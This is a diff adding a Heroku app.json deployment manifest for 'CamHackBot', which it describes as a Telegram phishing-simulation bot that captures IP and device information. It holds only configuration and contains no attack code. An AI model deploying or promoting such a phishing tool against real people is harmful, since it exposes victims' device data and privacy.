@@ -1,0 +1,22 @@
+{
+  "name": "CamHackBot",
+  "description": "Telegram bot for phishing simulation with IP, device info, and webview",
+  "repository": "https://github.com/Bloodlinebots/CamHackBot-main",
+  "logo": "https://raw.githubusercontent.com/Bloodlinebots/CamHackBot-main/main/icon.png",
+  "keywords": ["node", "telegram", "phishing", "bot", "ejs", "express"],
+  "env": {
+    "bot": {
+      "description": "Telegram Bot Token",
+      "required": true
+    },
+    "PORT": {
+      "description": "Port (used by Heroku)",
+      "value": "3000"
+    }
+  },
+  "buildpacks": [
+    {
+      "url": "heroku/nodejs"
+    }
+  ]
+}
